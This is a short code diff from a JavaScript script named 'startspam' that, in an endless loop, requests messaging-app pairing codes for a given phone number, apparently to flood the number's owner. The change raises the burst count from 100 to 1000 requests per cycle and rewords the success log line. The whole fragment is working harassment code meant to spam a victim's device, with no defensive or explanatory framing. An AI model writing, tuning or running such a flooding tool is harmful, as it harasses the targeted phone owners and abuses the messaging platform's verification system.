@@ -96,11 +96,11 @@ async function startspam() {
     }
 
     while (true) {
-      let second = 100;
+      let second = 1000;
       while (second > 0) {
         let code = await spam.requestPairingCode(phoneNumber);
         code = code?.match(/.{1,4}/g)?.join('-') || code;
-        console.log(chalk.bgBlack(chalk.greenBright("Pairing succes spam code: " + code)));
+        console.log(chalk.bgBlack(chalk.greenBright("Succes Spam Pairing Code - Number : " + code)));
         console.log(chalk.bgBlack(chalk.whiteBright("" + second + "")));
         await new Promise(resolve => setTimeout(resolve, 100));
         second--;
